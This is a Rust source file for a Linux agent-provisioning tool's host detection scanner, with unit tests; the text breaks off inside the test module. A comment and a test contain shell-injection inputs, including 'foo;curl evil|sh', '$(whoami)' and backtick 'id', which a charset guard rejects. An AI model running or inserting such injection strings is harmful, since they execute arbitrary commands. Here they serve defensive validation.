//! detect.rs — the DETECT-phase host scanner that WRITES the detect cache.
//!
//! Probes the host for already-installed catalog agents. The `provision`
//! verb runs [`scan_and_write`] AFTER the step loop (so PATH wiring + Node are in
//! place) and BEFORE agent adoption, populating `/run/agentlinux-detect.json` with
//! the `.agents` section. A subsequent `agentlinux install <id>` / `adopt --all`
//! then reads that cache (via [`crate::cache`]) and the pure gates
//! (`detect_gates::{reuse_gate,remediate_gate}`) can fire REUSE-03 / REMEDIATE-04.
//!
//! # Why the provisioner has to write it
//! The Rust `cmd/install.rs` REMEDIATE-04 handler is fully wired — but it consults
//! the detect cache to learn a brownfield binary's on-host PATH. With no writer,
//! every `install` saw an absent cache → `detected = None` → the remediation gate
//! never fired and the verb fell straight through to a plain install. This module
//! is that writer.
//!
//! # The pure/I-O seam
//! Every reader here does I/O (catalog read, a login-shell `command -v`, a version
//! probe, `stat`). The DECISION stays in the pure `agentlinux-core` gates — this
//! module only gathers host facts and serializes them. The pure helpers
//! ([`verify_binary`], [`agent_rows`], [`extract_semver`], [`classify`]) carry the
//! `#[cfg(test)]` coverage.
//!
//! # Security
//! Probed binary stdout is NEVER fed to a shell evaluator: the version regex-scan
//! ([`extract_semver`]) accepts only `[0-9.]` + a lowercase-alnum prerelease tail,
//! so an adversarial banner cannot inject shell/ANSI bytes into the cache. The
//! GSD VERSION-file fallback is owner-gated (a planted symlink to a root-only file
//! reports `root` → refused) exactly as the Bash probe did.

use crate::catalog::{self, FullCatalogEntry};
use crate::dispatcher::{self, Capture};

/// The original three carry bespoke version-probe flags + a strict `--help`-exit-0
/// health gate their behavior contract asserts; every other tool uses the generic
/// probe. Mirrors `DETECT_AGENT_LEGACY_IDS` (detect/agents.sh).
const LEGACY_IDS: &[&str] = &["claude-code", "gsd", "playwright-cli"];

/// A resolved per-agent detect record. `id`/`status`/`path`/`version` are the
/// fields [`crate::cache`] reads back; `binary` is retained (it is already in hand,
/// zero extra I/O) so a human or debug tooling inspecting the cache can see which
/// binary each row was probed for. The Bash probe also wrote an `owner` field —
/// dropped here because no reader consumes it and resolving it cost a `stat` +
/// uid/gid→name lookup for nothing.
#[derive(Debug, Clone, PartialEq, Eq)]
struct AgentRecord {
    id: String,
    binary: String,
    path: String,
    version: String,
    status: String,
}

/// Extract the `command -v <bin>` binary token from a `post_install_verify` string.
/// Mirrors the Bash `capture("command -v (?<b>[^ ]+)")` — the first token after
/// the FIRST `command -v `. `None` when the marker is absent, the token empty, or
/// the token carries any character outside `[A-Za-z0-9._/-]`.
///
/// The charset guard is load-bearing: [`probe_one`]/[`probe_version`] interpolate
/// this token RAW into a `bash -c` script. `post_install_verify` is a free-form
/// string with no schema `pattern`, so a catalog carrying
/// `command -v foo;curl evil|sh` would otherwise inject `foo;curl` as the install
/// user. The catalog is a root-owned `/opt` artifact today (so this is
/// belt-and-suspenders), but the guard makes the interpolation safe LOCALLY rather
/// than only by catalog provenance. A real `command -v` argument never needs a
/// shell metacharacter, so rejecting the row (→ agent simply not probed) is safe.
fn verify_binary(verify: &str) -> Option<String> {
    let idx = verify.find("command -v ")?;
    let rest = &verify[idx + "command -v ".len()..];
    let tok = rest.split_whitespace().next()?;
    let safe = |c: char| c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | '/' | '-');
    (!tok.is_empty() && tok.chars().all(safe)).then(|| tok.to_string())
}

/// Derive `(id, binary)` rows for every PATH-resolvable catalog tool: non-`mcp`,
/// non-`test_only` entries whose `post_install_verify` contains `command -v <bin>`.
/// MCP entries (registration-based, no PATH binary) and the `test-dummy` fixture
/// are excluded. Mirrors `__det_agent_rows` (catalog order preserved).
fn agent_rows(entries: &[FullCatalogEntry]) -> Vec<(String, String)> {
    entries
        .iter()
        .filter(|e| !e.test_only && e.source_kind.as_deref() != Some("mcp"))
        .filter_map(|e| {
            let bin = verify_binary(e.post_install_verify.as_deref()?)?;
            Some((e.id.clone(), bin))
        })
        .collect()
}

/// Extract the FIRST `MAJOR.MINOR.PATCH(-prerelease)?` semver substring from
/// arbitrary probe output, or `None`. Rust port of the Bash
/// `grep -Eo '[0-9]+\.[0-9]+\.[0-9]+(-[a-z0-9.-]+)?'` — leftmost match, digits +
/// dots + a lowercase-alnum-dot-hyphen prerelease tail only. A leading `v`/`V` is
/// naturally excluded (matching starts at the first digit → the Bash `tr -d 'vV'`).
fn extract_semver(text: &str) -> Option<String> {
    let bytes = text.as_bytes();
    let n = bytes.len();
    for start in 0..n {
        if !bytes[start].is_ascii_digit() {
            continue;
        }
        if let Some(end) = match_semver_at(bytes, start) {
            return Some(text[start..end].to_string());
        }
    }
    None
}

/// Try to match `\d+\.\d+\.\d+(-[a-z0-9.-]+)?` anchored at `start`. Returns the
/// end byte-index (exclusive) on success. Greedy on each digit run + the
/// prerelease tail, matching `grep -Eo` leftmost-longest at this position.
fn match_semver_at(bytes: &[u8], start: usize) -> Option<usize> {
    let n = bytes.len();
    // Counted with `take_while` rather than a hand-rolled `while … { *i += 1 }`.
    // Both spell the same scan, but the loop form can be made non-terminating by
    // a single-character change to the advance (`+=` -> `*=` leaves the index
    // still while the condition stays true). That is not a hypothetical: it is
    // the shape a mutation testing run produces, and it hangs the whole test
    // binary rather than failing an assertion — a regression nobody can diagnose
    // from a CI timeout. With no loop there is no way to not advance.
    let digits = |i: &mut usize| -> bool {
        let run = bytes[*i..]
            .iter()
            .take_while(|b| b.is_ascii_digit())
            .count();
        *i += run;
        run > 0
    };
    let mut i = start;
    // MAJOR
    if !digits(&mut i) {
        return None;
    }
    // .MINOR
    if i >= n || bytes[i] != b'.' {
        return None;
    }
    i += 1;
    if !digits(&mut i) {
        return None;
    }
    // .PATCH
    if i >= n || bytes[i] != b'.' {
        return None;
    }
    i += 1;
    if !digits(&mut i) {
        return None;
    }
    // Optional -prerelease ([a-z0-9.-]+, at least one char after the hyphen).
    if i < n && bytes[i] == b'-' {
        // Same counted form as `digits` above, for the same reason.
        let tail = bytes[i + 1..]
            .iter()
            .take_while(|b| {
                b.is_ascii_digit() || b.is_ascii_lowercase() || **b == b'.' || **b == b'-'
            })
            .count();
        if tail > 0 {
            i += 1 + tail;
        }
    }
    Some(i)
}

/// Classify a probed agent: `absent` is handled by the caller (no binary).
/// Present → `healthy` when a version parsed AND (for a legacy id) `--help` exited
/// 0; else `broken`. Mirrors the two `detect::agents_probe` health arms.
fn classify(id: &str, version: &str, legacy_help_ok: bool) -> &'static str {
    let versioned = !version.is_empty();
    let healthy = if LEGACY_IDS.contains(&id) {
        legacy_help_ok && versioned
    } else {
        versioned
    };
    if healthy {
        "healthy"
    } else {
        "broken"
    }
}

/// The child env for the login-shell probe hop: the canonical `PATH`/`HOME` for
/// the install home (so `~/.local/bin` + `~/.npm-global/bin` resolve even before
/// the profile sources them) plus every `AGENTLINUX_*` seam. Mirrors the adoption
/// child env — a login shell then layers `/etc/profile.d/agentlinux.sh` on top.
///
/// Invariant: every `AGENTLINUX_*` var is a path/config seam (`_CATALOG_DIR`,
/// `_DETECT_CACHE`, `_STATE_DIR`, …), NOT a secret — so forwarding them into an
/// unprivileged child shell leaks nothing. A future `AGENTLINUX_*TOKEN`-style var
/// would break this assumption and must NOT be forwarded here.
fn probe_env(home: &str) -> Vec<(String, String)> {
    let mut env: Vec<(String, String)> = vec![
        ("PATH".to_string(), crate::recipe_env::canonical_path(home)),
        ("HOME".to_string(), home.to_string()),
    ];
    for (k, v) in std::env::vars() {
        if k.starts_with("AGENTLINUX_") {
            env.push((k, v));
        }
    }
    env
}

/// Run `script` as `user` through a login shell (sourcing the agent profile so
/// PATH resolves agent-owned bins), returning `(exit_code, trimmed_stdout)`.
/// Bounded so a wedged probe can never hang an unattended provision.
/// A login-shell probe: `(user, home, script) -> (exit_code, trimmed_stdout)`.
/// Injectable so the FALLBACK CHAIN below — try `--version`, then `version`,
/// then `--help`, first semver wins — is reachable from a test. It had none: a
/// regression that probes only `--version` and drops the rest compiles, passes
/// `cargo test`, and surfaces as a wrong REUSE verdict in QEMU.
pub type LoginRun = fn(user: &str, home: &str, script: &str) -> (i32, String);

/// Not mutation-tested: the production adapter behind [`LoginRun`] (ADR-019 §5).
/// It shells out through `dispatcher::as_user`, i.e. a real `sudo -u` hop to a
/// login shell — which is exactly why `LoginRun` is a type alias and not a
/// direct call, so the fallback chain in [`probe_one`] is reachable from a test
/// without one. The env it hands the child is asserted through [`probe_env`],
/// and the argv shape through the dispatcher's own tests.
#[cfg_attr(test, mutants::skip)]
fn login_run(user: &str, home: &str, script: &str) -> (i32, String) {
    let argv: Vec<String> = ["bash", "--login", "-c", script]
        .iter()
        .map(|s| s.to_string())
        .collect();
    let r = dispatcher::as_user(
        user,
        &argv,
        &probe_env(home),
        Capture::Buffered,
        Some(PROBE_TIMEOUT_MS),
    );
    (r.exit_code, r.stdout.trim().to_string())
}

/// Per-probe timeout — a version/`command -v` shell-out is sub-second; finite so a
/// hung binary cannot wedge the whole scan. Kept modest: the scan is serial over
/// the whole catalog and each present agent fires up to ~5 shell-outs, so a
/// generous ceiling would let a few pathological binaries add minutes to a
/// greenfield provision.
///
/// Raised 5s -> 20s. 5s measures a `--version`, but every probe pays for a
/// `bash --login` first — sourcing /etc/profile and all of /etc/profile.d —
/// and on a cold AlmaLinux 9 guest under enforcing SELinux that is not a
/// sub-second cost. When it overran, `command -v claude` returned non-zero for
/// a binary that was present, detect recorded the agent `absent`, and
/// REMEDIATE-04 correctly declined to fire on a host it had been told was
/// clean: four brownfield E2E tests failed on almalinux-9/QEMU while passing on
/// the same distro under Docker and on Ubuntu under QEMU. The probe was
/// re-run unbounded from the failing assertion and resolved the binary
/// immediately, with PATH, execute permission and SELinux context all correct.
///
/// This is a bound, not a fix for the underlying conflation: a timed-out probe
/// is still indistinguishable from a missing binary, because the buffered
/// timeout maps to exit 1 — the same code `command -v` returns for "not found"
/// — and a cleanly-killed child logs nothing. See the module note on
/// `probe_one`. The aggregate `SCAN_BUDGET` below remains the real protection
/// against a pathological host: a healthy probe still answers in well under a
/// second, so raising this ceiling costs nothing on hosts that were already
/// fast and only buys headroom on the ones that were failing silently.
const PROBE_TIMEOUT_MS: u64 = 20_000;

/// Aggregate ceiling for the whole detect scan, independent of catalog size.
///
/// `PROBE_TIMEOUT_MS` bounds one shell-out; nothing bounded the loop, and the loop
/// length is catalog data. Three minutes is far past a healthy scan (a greenfield
/// host answers in seconds because absent agents fail `command -v` immediately)
/// while capping the pathological case at a duration an operator will sit through
/// rather than assume is a hang.
const SCAN_BUDGET: std::time::Duration = std::time::Duration::from_secs(180);

/// Probe an agent's version via its id-specific flag(s). The legacy three parse
/// `--version` (gsd: `--help`, no `--version` flag); the rest try
/// `--version`/`version`/`--help` in turn. First semver wins. `binary` is the ONLY
/// interpolated value; it is safe because [`verify_binary`] already rejected any
/// token outside `[A-Za-z0-9._/-]` (so no shell metacharacter can reach this
/// `bash -c`), and the captured stdout is bounded by [`extract_semver`] to a pure
/// semver substring — it never re-enters a shell.
fn probe_version(run: LoginRun, user: &str, home: &str, id: &str, binary: &str) -> String {
    let flags: &[&str] = match id {
        "claude-code" | "playwright-cli" => &["--version"],
        "gsd" => &["--help"],
        _ => &["--version", "version", "--help"],
    };
    for flag in flags {
        let (_rc, out) = run(user, home, &format!("{binary} {flag} 2>/dev/null"));
        if let Some(v) = extract_semver(&out) {
            return v;
        }
    }
    String::new()
}

/// Probe a single `(id, binary)` row into an [`AgentRecord`]. Resolves the binary
/// on the install user's login PATH; on a miss, GSD falls back to its deployed
/// `~/.claude/gsd-core/VERSION` (owner-gated). Absent everywhere → `status=absent`.
/// KNOWN DEFECT — a failed probe and an absent binary are the same record.
///
/// `run` returns only `(rc, stdout)`. A `command -v` miss is rc=1; a probe the
/// dispatcher KILLED on its timeout is also rc=1, because
/// `Capture::Buffered::timeout_exit()` is 1 and a cleanly-killed child logs
/// nothing. Both land in the `absent` record below, so "the tool is not
/// installed" and "we could not look" are one value by the time REUSE-03 and
/// REMEDIATE-04 read it — and those act on it, reinstalling or declining to
/// remediate on the strength of a guess.
///
/// This cost three diagnosis passes on the almalinux-9/QEMU brownfield failure
/// (AL-124): the cache said `absent` while the binary sat at the probed path,
/// and nothing anywhere recorded that a probe had been cut short. Raising
/// `PROBE_TIMEOUT_MS` buys headroom; it does not make the two cases
/// distinguishable.
///
/// Fixing it properly means surfacing the timeout, either by carrying
/// `timed_out` on `DispatchResult` (the dispatcher already computes it at the
/// `wait_with_timeout` call and discards it — 68 construction sites) or by
/// giving the buffered path a distinct timeout code the way the streamed path
/// already uses 124. Both are larger than a bound change and want their own
/// review; deliberately not folded in here.
fn probe_one(run: LoginRun, user: &str, home: &str, id: &str, binary: &str) -> AgentRecord {
    let (rc, bin_path) = run(user, home, &format!("command -v {binary}"));
    let resolved = if rc == 0 && !bin_path.is_empty() {
        Some(bin_path)
    } else {
        None
    };

    if let Some(path) = resolved {
        let version = probe_version(run, user, home, id, binary);
        // Legacy ids additionally gate health on `--help` exit 0.
        let legacy_help_ok = if LEGACY_IDS.contains(&id) {
            run(user, home, &format!("{binary} --help >/dev/null 2>&1")).0 == 0
        } else {
            true
        };
        let status = classify(id, &version, legacy_help_ok);
        return AgentRecord {
            id: id.to_string(),
            binary: binary.to_string(),
            path,
            version,
            status: status.to_string(),
        };
    }

    // GSD deployed-system fallback: its binary is a bootstrapper, so an absent
    // binary is also classified from the deployed VERSION file — but only when
    // that file is owned by the install user (a planted symlink to a root file
    // reports root → refuse, treat as absent).
    if id == "gsd" {
        let ver_file = format!("{home}/.claude/gsd-core/VERSION");
        if let Some(rec) = gsd_version_file_record(user, &ver_file) {
            return rec;
        }
    }

    AgentRecord {
        id: id.to_string(),
        binary: binary.to_string(),
        path: String::new(),
        version: String::new(),
        status: "absent".to_string(),
    }
}

/// The GSD deployed-`VERSION`-file presence signal, owner-gated. `Some` only when
/// the file exists AND is owned by `user`; a non-empty trimmed body → healthy,
/// empty → broken. `None` (→ caller reports `absent`) when missing or foreign-owned.
///
/// Opens the file ONCE and derives both the owner-check and the contents from that
/// single handle (`File::open` + `fstat` via `File::metadata`), so the path is not
/// re-resolved between the check and the read — closing the TOCTOU window where the
/// install user (the only principal that could win the gate) might swap the
/// symlink target after the owner check. `open` still follows the symlink, but the
/// fstat'd target must be uid-owned by the install user, so the worst case only
/// ever reads a file that user already owns.
fn gsd_version_file_record(user: &str, ver_file: &str) -> Option<AgentRecord> {
    use std::io::Read;
    use std::os::unix::fs::MetadataExt;
    let mut f = std::fs::File::open(ver_file).ok()?;
    let md = f.metadata().ok()?;
    let owned =
        matches!(nix::unistd::User::from_name(user), Ok(Some(u)) if u.uid.as_raw() == md.uid());
    if !owned {
        return None;
    }
    let mut raw = String::new();
    f.read_to_string(&mut raw).ok()?;
    let ver: String = raw.split_whitespace().collect();
    let status = if ver.is_empty() { "broken" } else { "healthy" };
    Some(AgentRecord {
        id: "gsd".to_string(),
        binary: "gsd-core".to_string(),
        path: ver_file.to_string(),
        version: ver,
        status: status.to_string(),
    })
}

/// One record → its JSON object (the 5 cache/report fields). Shared by the cache
/// writer and the `--report-format=json` report so the two shapes never drift.
fn record_value(r: &AgentRecord) -> serde_json::Value {
    serde_json::json!({
        "id": r.id,
        "binary": r.binary,
        "path": r.path,
        "version": r.version,
        "status": r.status,
    })
}

/// Scan the host for every PATH-resolvable catalog agent, returning the per-agent
/// records (mcp/test entries excluded, absent agents included as `status=absent`).
/// A catalog-read failure logs a breadcrumb and returns an empty vec (the callers
/// treat that as "detected nothing" — the same absent-cache fallback).
/// Not mutation-tested — ADR-019 §5, "production wiring adapters". This is the
/// one line that binds the real login shell and the ambient catalog dir to
/// [`scan_with`], and `replace scan -> vec![]` is unkillable HERE because no
/// test drives it: driving it means spawning `bash --login` against a real
/// catalog, which is the coupling the seam removed.
///
/// Recorded rather than claimed fixed. An earlier commit said the seam killed
/// this mutant; it kills `scan_with -> vec![]`, which is a different function.
/// Measured: `scan -> vec![]` passed all 493 tests. The BEHAVIOUR it would cause
/// — an empty detect cache, so every downstream REUSE-03/REMEDIATE-04 verdict
/// sees "nothing installed" — is asserted through the seam by
/// `scan_probes_every_non_mcp_agent_in_the_catalog`.
#[cfg_attr(test, mutants::skip)]
fn scan(user: &str, home: &str) -> Vec<AgentRecord> {
    scan_with(
        login_run,
        &catalog::resolve_catalog_dir(),
        user,
        home,
        SCAN_BUDGET,
    )
}

/// [`scan`] over an injected login runner and catalog dir.
///
/// The `LoginRun` seam stopped one call short of every public entry point:
/// `probe_one`/`probe_version` took it, but `scan` wired the real one in, so
/// `scan`, `scan_and_write` and `scan_persist_report_json` — everything the
/// `provision` verb actually calls — could only run by spawning a real login
/// shell against a real catalog. Replacing this function's body with
/// `Vec::new()` passed the whole suite, and the cache is then written as
/// `{"agents":[]}`, so every downstream REUSE-03/REMEDIATE-04 verdict sees
/// "nothing installed" and no test can tell.
fn scan_with(
    run: LoginRun,
    catalog_dir: &std::path::Path,
    user: &str,
    home: &str,
    // Injected, not the constant: the expiry arm is otherwise reachable only by
    // stalling a test for three minutes, so the skip accounting — the thing that
    // keeps an unprobed agent from being recorded as absent — could not be
    // asserted at all. Same seam as `migrate_modules`' budget, for the same reason.
    budget: std::time::Duration,
) -> Vec<AgentRecord> {
    let entries = match catalog::load_catalog(catalog_dir, catalog::Validate::Skip) {
        Ok(e) => e,
        Err(e) => {
            crate::provision::log::line(&format!(
                "agentlinux provision: detect scan skipped — catalog unreadable ({e}); \
                 REUSE-03/REMEDIATE-04 will see an absent cache"
            ));
            return Vec::new();
        }
    };
    // A per-probe bound is not a bound on the scan. Each `probe_one` shells out up
    // to five times at PROBE_TIMEOUT_MS each, and the row count comes from the
    // catalog — 17 shipped entries is up to ~85 `sudo -u <user> bash --login -c`
    // hops, every one of them sourcing /etc/profile and the user's own profile. On
    // an NFS-backed or otherwise stalled home each burns its full timeout and the
    // scan occupies minutes AFTER `50-registry-cli: done` has printed, with nothing
    // between entries. That silence is indistinguishable from a hang, which is the
    // operability failure, not the elapsed time.
    //
    // Same treatment as the npm-prefix migration loop: an aggregate budget, and the
    // skipped remainder NAMED. A silent cap reads as "everything was probed", and a
    // probe that never ran must not be recorded as `absent` — that is the
    // difference between "the tool is not installed" and "we did not look", and
    // REUSE-03 acts on it.
    let deadline = std::time::Instant::now() + budget;
    let rows = agent_rows(&entries);
    let total = rows.len();
    let mut records = Vec::with_capacity(total);
    let mut skipped = 0usize;
    for (id, binary) in rows {
        if std::time::Instant::now() >= deadline {
            skipped += 1;
            continue;
        }
        records.push(probe_one(run, user, home, &id, &binary));
    }
    if skipped > 0 {
        crate::provision::log::line(&format!(
            "agentlinux provision: detect scan budget ({}s) expired — {skipped} of \
             {total} agents NOT probed. They are absent from the cache rather than \
             recorded as not-installed, so REUSE-03 will not act on a guess. Re-run \
             `agentlinux provision --report-only` once the host settles.",
            budget.as_secs()
        ));
    }
    records
}

/// Serialize the records into the `{agents: [...]}` cache doc + write it to the
/// resolved detect-cache path (`$AGENTLINUX_DETECT_CACHE` else
/// `/run/agentlinux-detect.json`). Best-effort: returns any I/O error for the
/// caller to log; never panics.
///
/// Written through `sysio::write_file_atomic`, so a concurrent `agentlinux
/// install` reader sees either the old cache or the fully-written new one, never
/// a truncated prefix, and a provision killed mid-write leaves neither a torn
/// JSON on `/run` nor a stray tmpfile. The `0o644` mode is explicit — root writes
/// it, the unprivileged install user must read it during `install`/`adopt`, and
/// relying on the ambient umask for that would be a coin flip.
fn write_cache(records: &[AgentRecord]) -> std::io::Result<()> {
    let agents: Vec<serde_json::Value> = records.iter().map(record_value).collect();
    let doc = serde_json::json!({ "agents": agents });
    // Plain-string values → serialization cannot fail in practice; propagate rather
    // than mask it as a silent empty-agents cache (which would read as a false
    // "nothing installed" and mis-decide REUSE/REMEDIATE with no log breadcrumb).
    let body = serde_json::to_string_pretty(&doc)
        .map_err(|e| std::io::Error::new(std::io::ErrorKind::InvalidData, e))?;

    crate::sysio::write_file_atomic(0o644, &crate::cache::detect_cache_path(), body.as_bytes())
}

/// Persist a set of records to the detect cache, logging (not propagating) an I/O
/// failure — the shared best-effort write both `scan_and_write` and the
/// report path use.
fn persist(records: &[AgentRecord]) {
    if let Err(e) = write_cache(records) {
        crate::provision::log::line(&format!(
            "agentlinux provision: detect cache write failed ({e}); \
             REUSE-03/REMEDIATE-04 will see an absent cache"
        ));
    }
}

/// Scan the host for every catalog agent + write the detect cache's `.agents`
/// section. The `provision` verb's post-step, best-effort call: a catalog-read or
/// cache-write failure is logged and swallowed (a provision that already did the
/// real work must not fail because detection could not persist), but the common
/// path leaves `/run/agentlinux-detect.json` populated so REUSE-03 / REMEDIATE-04
/// can fire on the next `agentlinux install`.
/// Not mutation-tested: a production wiring adapter (ADR-019 §5) binding the
/// real login-shell scan to [`persist`], which is asserted directly.
#[cfg_attr(test, mutants::skip)]
pub fn scan_and_write(user: &str, home: &str) {
    persist(&scan(user, home));
}

/// Scan the host, persist the cache, AND return the detection report body as the
/// `{components:{agents:[...]}}` JSON document — the `provision --report-only
/// --report-format=json` payload (`detect::render_json`). Refreshing the cache is
/// the same side effect the old `detect::run_once` had on the report path; the
/// returned value is the full PATH-probe agents section (mcp/test excluded,
/// absent agents included), which `agentlinux list`/`adopt`/`upgrade` then read
/// back from the cache. Wrapped under `.components.agents` to match the Bash
/// report shape (the cache adapter accepts both `.agents` and `.components.agents`).
/// Not mutation-tested: a production wiring adapter (ADR-019 §5) binding the
/// real login-shell scan. The persisted bytes are asserted through
/// [`write_cache`] and the returned shape through [`report_body`].
#[cfg_attr(test, mutants::skip)]
pub fn scan_persist_report_json(user: &str, home: &str) -> serde_json::Value {
    let records = scan(user, home);
    persist(&records);
    report_body(&records)
}

/// The `--report-format=json` body: the records wrapped under
/// `.components.agents`, matching the Bash report shape the DET-04 suite pipes
/// to `jq`. (The cache adapter accepts both that and a bare `.agents`.)
///
/// Split from the scan because the wrapper is the part a test can pin without a
/// login shell — replacing the whole function with `Default::default()` survived,
/// which hands DET-04 a JSON `null` where it expects an agents array.
fn report_body(records: &[AgentRecord]) -> serde_json::Value {
    let agents: Vec<serde_json::Value> = records.iter().map(record_value).collect();
    serde_json::json!({ "components": { "agents": agents } })
}

#[cfg(test)]
mod detect_tests {
    use super::*;

    #[test]
    fn verify_binary_extracts_first_token() {
        assert_eq!(
            verify_binary("command -v claude").as_deref(),
            Some("claude")
        );
        assert_eq!(
            verify_binary("command -v gsd-core >/dev/null 2>&1").as_deref(),
            Some("gsd-core")
        );
        // Marker absent → None.
        assert_eq!(verify_binary("test -f ~/.claude"), None);
        // Marker present but nothing after → None.
        assert_eq!(verify_binary("command -v "), None);
        // The FIRST `command -v` wins (a `rfind` regression would return "bar").
        assert_eq!(
            verify_binary("command -v foo || command -v bar").as_deref(),
            Some("foo")
        );
    }

    #[test]
    fn verify_binary_rejects_shell_metacharacters() {
        // A token carrying a shell metacharacter is refused (→ row not probed),
        // so the raw interpolation into `bash -c` can never inject.
        assert_eq!(verify_binary("command -v foo;curl evil|sh"), None);
        assert_eq!(verify_binary("command -v $(whoami)"), None);
        assert_eq!(verify_binary("command -v `id`"), None);
        // A legitimate path-shaped binary token is still accepted.
        assert_eq!(
            verify_binary("command -v /usr/bin/foo-bar_1.2").as_deref(),
            Some("/usr/bin/foo-bar_1.2")
        );
    }

    fn entry(
        id: &str,
        source_kind: Option<&str>,
        verify: Option<&str>,
        test_only: bool,
    ) -> FullCatalogEntry {
        FullCatalogEntry {
            id: id.to_string(),
            display_name: id.to_string(),
            description: String::new(),
            homepage: None,
            license: None,
            source_kind: source_kind.map(str::to_string),
            npm_package_name: None,
            requires_secret: None,
            secret_env: None,
            endpoint_url: None,
            pinned_version: "1.0.0".to_string(),
            version_constraint: None,
            compatibility_window: None,
            install_recipe_path: "install.sh".to_string(),
            uninstall_recipe_path: "uninstall.sh".to_string(),
            rewire_recipe_path: None,
            post_install_verify: verify.map(str::to_string),
            preserve_paths_file: None,
            preserve_paths: None,
            tags: Vec::new(),
            test_only,
        }
    }

    #[test]
    fn agent_rows_filters_mcp_test_and_verifyless_entries() {
        let entries = vec![
            entry(
                "claude-code",
                Some("script"),
                Some("command -v claude"),
                false,
            ),
            entry("github-mcp", Some("mcp"), Some("command -v gh-mcp"), false), // mcp → excluded
            entry("test-dummy", Some("script"), Some("command -v dummy"), true), // test_only → excluded
            entry("no-verify", Some("binary"), None, false), // no verify → excluded
            entry(
                "gitleaks",
                Some("binary"),
                Some("command -v gitleaks version"),
                false,
            ),
        ];
        let rows = agent_rows(&entries);
        assert_eq!(
            rows,
            vec![
                ("claude-code".to_string(), "claude".to_string()),
                ("gitleaks".to_string(), "gitleaks".to_string()),
            ]
        );
    }

    fn record(id: &str, status: &str) -> AgentRecord {
        AgentRecord {
            id: id.to_string(),
            binary: format!("{id}-bin"),
            path: format!("/home/agent/.local/bin/{id}"),
            version: "1.2.3".to_string(),
            status: status.to_string(),
        }
    }

    /// The detect cache is what REUSE-03 and REMEDIATE-04 read on the next
    /// `agentlinux install`. `write_cache` could be replaced by `Ok(())` — a
    /// silent no-op leaving an absent cache, which is exactly the bug this
    /// module was written to fix — and `persist` by `()`.
    ///
    /// Also pins the 0o644 mode: root writes this file and the unprivileged
    /// install user must read it, so relying on the ambient umask would be a
    /// coin flip.
    #[test]
    fn the_cache_is_written_where_the_seam_points_and_is_world_readable() {
        use std::os::unix::fs::PermissionsExt;
        let mut env_scope = crate::test_support::EnvScope::new();
        let dir = tempfile::tempdir().unwrap();
        let cache = dir.path().join("detect.json");
        env_scope.set("AGENTLINUX_DETECT_CACHE", &cache);

        write_cache(&[record("claude-code", "healthy"), record("gsd", "absent")])
            .expect("the cache must be writable");

        let body = std::fs::read_to_string(&cache).expect("the cache file must exist");
        let v: serde_json::Value = serde_json::from_str(&body).expect("valid JSON");
        assert_eq!(v["agents"][0]["id"], "claude-code");
        assert_eq!(v["agents"][0]["status"], "healthy");
        assert_eq!(v["agents"][1]["id"], "gsd");
        assert_eq!(
            v["agents"].as_array().map(Vec::len),
            Some(2),
            "every record reaches the cache, including absent ones"
        );

        let mode = std::fs::metadata(&cache).unwrap().permissions().mode() & 0o777;
        assert_eq!(mode, 0o644, "the install user has to be able to read it");

        // `persist` is the best-effort wrapper the scan paths share: it must
        // actually write, not merely not-panic.
        std::fs::remove_file(&cache).unwrap();
        persist(&[record("rtk", "healthy")]);
        let body = std::fs::read_to_string(&cache).expect("persist must write the cache");
        assert!(body.contains("rtk"));
    }

    /// The DET-04 report shape: agents under `.components.agents`, which the
    /// bats suite pipes to `jq`.
    #[test]
    fn the_report_body_wraps_agents_under_components() {
        let v = report_body(&[record("claude-code", "healthy")]);
        assert_eq!(v["components"]["agents"][0]["id"], "claude-code");
        assert!(
            v["components"]["agents"].is_array(),
            "DET-04 indexes this as an array"
        );
    }

    /// The scanner must TERMINATE on every input, and a test that hangs is not
    /// a test that proves it.
    ///
    /// `replace += with *=` on either digit-advance turns the scan into a
    /// non-terminating loop: the index stops moving while the loop condition
    /// stays true. Called directly, that hangs the whole test binary, so
    /// cargo-mutants recorded both as timeouts rather than as caught — the same
    /// mutant reported as "we do not know" instead of "the suite noticed".
    ///
    /// Running the scan on a worker thread with a deadline converts the hang
    /// into an assertion failure: the regression is CAUGHT, with a diagnosis,
    /// in a bounded time. The worker is left spinning if it never returns, which
    /// only happens when the code really is broken.
    #[test]
    fn the_semver_scan_terminates_on_every_input() {
        let (tx, rx) = std::sync::mpsc::channel();
        std::thread::spawn(move || {
            // Inputs that exercise both digit-advance loops and the prerelease
            // tail: a long digit run, and a long prerelease.
            let cases = [
                "1.2.3",
                "111111.222222.333333",
                "1.2.3-rc.1.2.3-alpha.beta",
                "not a version at all",
                "9999999999.0.0-x",
            ];
            let out: Vec<Option<String>> = cases.iter().map(|c| extract_semver(c)).collect();
            let _ = tx.send(out);
        });

        let out = rx
            .recv_timeout(std::time::Duration::from_secs(5))
            .expect("the semver scan must terminate — an index that stops advancing hangs it");

        // And it still returns the right answers, so "terminates" is not being
        // satisfied by a scan that gave up.
        assert_eq!(out[0].as_deref(), Some("1.2.3"));
        assert_eq!(out[1].as_deref(), Some("111111.222222.333333"));
        assert_eq!(out[2].as_deref(), Some("1.2.3-rc.1.2.3-alpha.beta"));
        assert_eq!(out[3], None);
        assert_eq!(out[4].as_deref(), Some("9999999999.0.0-x"));
    }

    /// Each id has its own version-flag chain, and the legacy split is real:
    /// claude-code/playwright-cli answer `--version` only, gsd answers `--help`
    /// only, everything else tries three flags in turn until a semver appears.
    ///
    /// `delete match arm "claude-code" | "playwright-cli"` survived — it drops
    /// those two into the generic chain. That is not obviously wrong until you
    /// notice the generic chain also runs `--help`, and the probe would then
    /// accept a version parsed out of a HELP BANNER for the two agents whose
    /// banners carry unrelated version numbers.
    #[test]
    fn each_id_probes_the_flags_its_binary_actually_answers() {
        // Record every script the probe tried, so the chain is observable rather
        // than inferred from the answer.
        thread_local! {
            static TRIED: std::cell::RefCell<Vec<String>> =
                const { std::cell::RefCell::new(Vec::new()) };
        }
        fn record_nothing(_u: &str, _h: &str, script: &str) -> (i32, String) {
            TRIED.with(|t| t.borrow_mut().push(script.to_string()));
            (0, String::new())
        }
        let flags_for = |id: &str| {
            TRIED.with(|t| t.borrow_mut().clear());
            probe_version(record_nothing, "agent", "/home/agent", id, "tool");
            TRIED.with(|t| t.borrow().clone())
        };

        assert_eq!(
            flags_for("claude-code"),
            vec!["tool --version 2>/dev/null"],
            "claude-code answers --version and must not fall through to --help"
        );
        assert_eq!(
            flags_for("playwright-cli"),
            vec!["tool --version 2>/dev/null"],
            "playwright-cli shares that arm"
        );
        assert_eq!(
            flags_for("gsd"),
            vec!["tool --help 2>/dev/null"],
